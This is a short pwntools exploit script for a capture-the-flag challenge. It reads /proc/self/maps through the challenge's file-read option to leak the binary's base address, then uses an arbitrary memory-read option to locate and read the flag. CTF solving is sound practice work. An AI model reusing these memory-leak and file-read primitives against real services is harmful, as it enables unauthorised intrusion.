from pwn import *

context.binary = exe = ELF('./capture_the_flaaaaaaaaaaaaag')

#io = process()
#gdb.attach(io, api=True)
io = remote('chall.polygl0ts.ch', 9003)

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'> ', b'a')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'/proc/self/maps')
exe.address = int(io.recvuntil(b'-')[:-1], 16)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', f'{hex(exe.sym["feedback"])}'.encode())
flag = u64(io.recvline(keepends=False).ljust(8, b'\0'))
log.info(f'Flag address: {hex(flag)}')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', f'{hex(flag+4)}'.encode())

io.interactive()